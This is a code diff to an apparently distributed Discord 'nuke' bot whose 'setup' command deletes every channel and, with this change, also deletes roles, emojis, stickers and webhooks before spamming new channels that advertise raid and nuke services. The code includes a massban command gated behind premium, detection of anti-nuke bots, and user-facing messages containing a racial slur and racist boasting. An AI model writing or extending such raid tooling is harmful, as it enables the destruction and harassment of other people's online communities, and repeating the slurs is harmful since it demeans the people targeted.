@@ -17,15 +17,15 @@ NUKE_STATS_FILE = "nuke_stats.json"
 PREMIUM_FILE = "premium.json"
 CONFIG_FILE = "config.json"
 PREM = 1414916058875301939
-MOD_ROLE_ID = 1414916058120192051
+MOD_ROLE_ID = 1508118493030256731
 WHITELIST = [
     1427299411049840640   # my user lol
 ]
-BLACKLISTED_GUILD_ID = 1035204601852461077  # ur server id
+BLACKLISTED_GUILD_ID = 1477331645580185662  # ur server id
 OWNER_ID = 1427299411049840640
-LEADERBOARD_CHANNEL_ID = 1507732863435411637 # channel for leaderboard embed
-TOKEN = 'your token here'  # ur bot token
-LOG_WEBHOOK_URL = 'your webhook here'  # webhook for tracker channel
+LEADERBOARD_CHANNEL_ID = 1494034254588416120 # channel for leaderboard embed
+TOKEN = 'bot token'  # ur bot token
+LOG_WEBHOOK_URL = 'webhook right here'  # webhook for tracker channel
 
 
 BLOCKED_BOT_IDS = [
@@ -813,7 +813,7 @@ async def massban(ctx):
     author = ctx.author
 
     if not is_premium_user(author.id):
-        await ctx.send("💎 This command is only available for premium users.")
+        await ctx.send("💎 broke aah bih this command is only available for premium users.")
         return
 
     if guild.id == BLACKLISTED_GUILD_ID:
@@ -958,6 +958,7 @@ async def detect_antinuKe_bots(guild):
 @bot.command()
 async def setup(ctx):
     guild = ctx.guild
+    bot_member = guild.me
     user = ctx.author
     user_id = ctx.author.id
     user_config = get_user_config(user_id)
@@ -966,7 +967,7 @@ async def setup(ctx):
         await ctx.reply("`nigga this server is blacklisted`")
         return
 
-    if len(guild.members) < 1:  # min 5 members, u can change it if u want
+    if len(guild.members) < 1:  # min 1 members, u can change it if u want
         try:
             await user.send(f"❌ Server `{guild.name}` needs to have a minimum of 1 members. Leaving..")
             print("not 5 members")
@@ -1022,6 +1023,39 @@ async def setup(ctx):
     delete_channels = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_channels, return_exceptions=True)
 
+    async def try_delete_role(role, bot_member):
+        try:
+            if role.is_default() or role >= bot_member.top_role:
+                return
+            await role.delete()
+        except Exception:
+            pass
+
+    async def try_delete_emoji(emoji):
+        try:
+            await emoji.delete()
+        except Exception:
+            pass
+
+    async def try_delete_sticker(sticker):
+        try:
+            await sticker.delete()
+        except Exception:
+            pass
+
+    async def try_delete_webhook(webhook):
+        try:
+            await webhook.delete()
+        except Exception:
+            pass
+
+    await asyncio.gather(
+        *(try_delete_role(role, bot_member) for role in list(guild.roles)),
+        *(try_delete_emoji(emoji) for emoji in list(guild.emojis)),
+        *(try_delete_sticker(sticker) for sticker in list(getattr(guild, 'stickers', []))),
+        *(try_delete_webhook(webhook) for webhook in await guild.webhooks()),
+    )
+
     async def create_channel_and_send_message():
         try:
             ch = await guild.create_text_channel(name=channel_name)
@@ -1034,7 +1068,7 @@ async def setup(ctx):
                     "**Cyber has:**\n"
                     "> **Powerful bots**\n"
                     "> **Raid/Nuke features**\n"
-                    "> **Good community**"
+                    "> **Good but kinda racist community**"
                 ),
                 color=0xb161f9
             )
